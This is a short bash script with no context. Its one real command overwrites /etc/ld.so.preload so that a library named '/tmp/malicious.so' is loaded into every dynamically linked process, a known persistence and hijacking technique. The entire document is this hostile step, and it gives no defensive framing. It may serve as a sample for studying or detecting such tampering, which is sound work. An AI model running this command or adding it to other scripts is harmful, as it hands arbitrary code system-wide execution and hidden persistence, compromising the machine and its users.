#!/bin/bash
set -euo pipefail

echo "/tmp/malicious.so" > /etc/ld.so.preload
